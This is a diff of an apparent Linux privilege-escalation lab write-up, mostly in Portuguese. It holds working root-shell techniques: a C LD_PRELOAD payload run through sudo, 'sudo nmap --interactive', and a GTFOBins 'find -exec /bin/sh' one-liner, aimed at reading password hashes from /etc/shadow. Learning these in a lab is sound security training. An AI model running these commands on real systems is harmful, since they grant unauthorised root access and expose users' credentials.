@@ -18,18 +18,18 @@ Escreva um código C simples compilado como um arquivo de objeto compartilhado (
 Execute o programa com privilégios de sudo e a opção LD_PRELOAD apontando para o nosso arquivo .so.
 
 O código C simplesmente criará um shell com privilégios de root e pode ser escrito da seguinte forma:
-```
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
+>
+>#include <stdio.h>
+>#include <sys/types.h>
+>#include <stdlib.h>
+>
+>void _init() {
+>unsetenv("LD_PRELOAD");
+>setgid(0);
+>setuid(0);
+>system("/bin/bash");
+>}
 
-void _init() {
-unsetenv("LD_PRELOAD");
-setgid(0);
-setuid(0);
-system("/bin/bash");
-}
-```
 Podemos salvar esse código como shell.c e compilá-lo usando o gcc em um arquivo de objeto compartilhado usando os seguintes parâmetros;
 
 ```
@@ -43,3 +43,20 @@ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 ```
 Isso resultará na criação de um shell com privilégios de root.
 
+How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
+```
+sudo nmap --interactive
+```
+What is the hash of frank's password?
+
+Os hashes de senha geralmente são armazenados no arquivo /etc/shadow. Vamos verificar se podemos acessá-lo com nossos privilégios atuais.
+Como esperado, um usuário padrão não pode acessar o arquivo. Precisamos usar os três comandos que identificamos e que podemos executar com privilégios de sudo.
+
+Vamos tentar todos eles.
+Primeiro, vamos tentar o comando find.
+Vamos consultar o GTFOBins e obter o comando para iniciar um shell root usando o find com privilégios de sudo.
+
+>This function can be performed by any unprivileged user.
+```
+sudo find . -exec /bin/sh \; -quit
+```
